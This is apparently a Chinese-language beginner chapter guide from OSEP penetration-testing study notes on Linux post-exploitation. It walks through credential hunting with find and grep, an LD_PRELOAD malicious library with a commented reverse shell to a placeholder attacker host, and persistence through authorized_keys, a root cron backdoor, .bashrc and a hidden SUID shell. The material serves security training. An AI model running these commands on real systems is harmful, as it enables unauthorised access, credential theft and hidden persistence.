# Linux后渗透 - 新手章节指南

## 这个目录是干什么的？

虽然 OSEP 主要关注 Windows，但企业环境中也有很多 Linux 服务器。这个目录教你在 Linux 系统上的后渗透技术。

---

## 为什么要学这个？

```
现实情况：
├── 企业有 Web 服务器（通常是 Linux）
├── 有 DevOps 工具（Jenkins、Ansible 等）
├── 有容器环境（Docker、Kubernetes）
├── 有数据库服务器
└── 渗透测试需要覆盖这些系统

学习目的：
├── 在 Linux 上提取凭证

├── 实现权限维持
├── 进行横向移动
└── 绕过 Linux 安全机制
```

## 通俗理解核心概念

### Linux 配置文件利用

```
Linux 的特点：
├── 很多配置都是明文文件
├── 密码可能存在配置文件中
├── SSH 密钥可能权限配置不当
└── 历史命令可能包含敏感信息

重要的配置文件：
├── /etc/passwd - 用户信息
├── /etc/shadow - 密码哈希（需要 root）
├── ~/.ssh/ - SSH 密钥
├── ~/.bash_history - 命令历史
├── /etc/crontab - 定时任务
└── 各种应用的配置文件
```

### 共享库劫持

```
什么是共享库？
├── Linux 的 DLL 等价物
├── .so 文件
├── 程序运行时加载
└── 可以被劫持

劫持原理：
├── 程序查找共享库有优先级
├── LD_PRELOAD 最高优先级
├── 然后是 RPATH、LD_LIBRARY_PATH
├── 最后是系统目录
└── 我们可以在高优先级位置放恶意库

类比：
├── 程序要找一个帮手（共享库）
├── 它会按顺序在几个地方找
├── 我们在它先找的地方放一个假帮手
└── 程序就会用我们的假帮手
```

### Ansible 利用

```
什么是 Ansible？
├── 自动化运维工具
├── 可以批量管理服务器
├── 使用 SSH 连接
└── 配置文件可能包含凭证

利用点：
├── Ansible Vault 密码
├── 主机清单中的凭证
├── Playbook 中的敏感信息
├── SSH 密钥
└── 可以利用 Ansible 横向移动
```

## 实践任务清单

### 任务1：枚举敏感文件

```bash
# 查找可读的配置文件
find /etc -readable -type f 2>/dev/null | head -20

# 查找包含密码的文件
grep -r "password" /etc 2>/dev/null
grep -r "passwd" /home 2>/dev/null

# 查找 SSH 密钥
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# 查看命令历史
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
```

### 任务2：共享库劫持示例

```c
// 创建恶意共享库
// 保存为 evil.c

#include <stdio.h>
#include <stdlib.h>

// 构造函数，在库加载时执行
__attribute__((constructor))
void init() {
    system("id > /tmp/pwned.txt");
    // 或者反向 shell
    // system("bash -i >& /dev/tcp/attacker_ip/4444 0>&1");
}

// 编译
// gcc -shared -fPIC -o evil.so evil.c
```

```bash
# 使用 LD_PRELOAD 劫持
LD_PRELOAD=/path/to/evil.so /usr/bin/some_program

# 或者如果有写权限到 /etc/ld.so.preload
echo "/path/to/evil.so" > /etc/ld.so.preload
```

### 任务3：查找 Ansible 凭证

```bash
# 查找 Ansible 配置
find / -name "ansible.cfg" 2>/dev/null
find / -name "hosts" -path "*ansible*" 2>/dev/null
find / -name "*.yml" -path "*ansible*" 2>/dev/null

# 查找 Vault 密码文件
find / -name ".vault_pass*" 2>/dev/null
find / -name "vault_password*" 2>/dev/null

# 解密 Ansible Vault（如果有密码）
ansible-vault decrypt secret.yml --vault-password-file=.vault_pass
```

### 任务4：Linux 权限维持

```bash
# 方法1：SSH 密钥
mkdir -p ~/.ssh
echo "你的公钥" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 方法2：Cron 任务
echo "* * * * * /path/to/backdoor" >> /var/spool/cron/crontabs/root

# 方法3：修改 .bashrc
echo "/path/to/backdoor &" >> ~/.bashrc

# 方法4：创建 SUID 程序
cp /bin/bash /tmp/.hidden_bash
chmod u+s /tmp/.hidden_bash
# 使用: /tmp/.hidden_bash -p
```

## 重要文件位置

```
凭证相关：
├── /etc/shadow - 密码哈希
├── /etc/passwd - 用户信息
├── ~/.ssh/id_rsa - SSH 私钥
├── ~/.ssh/known_hosts - 已知主机
└── ~/.pgpass - PostgreSQL 密码

配置文件：
├── /etc/apache2/ - Apache 配置
├── /etc/nginx/ - Nginx 配置
├── /etc/mysql/ - MySQL 配置
├── /var/www/ - Web 应用
└── /opt/ - 第三方应用

日志文件：
├── /var/log/auth.log - 认证日志
├── /var/log/syslog - 系统日志
├── ~/.bash_history - 命令历史
└── /var/log/apache2/ - Web 日志
```
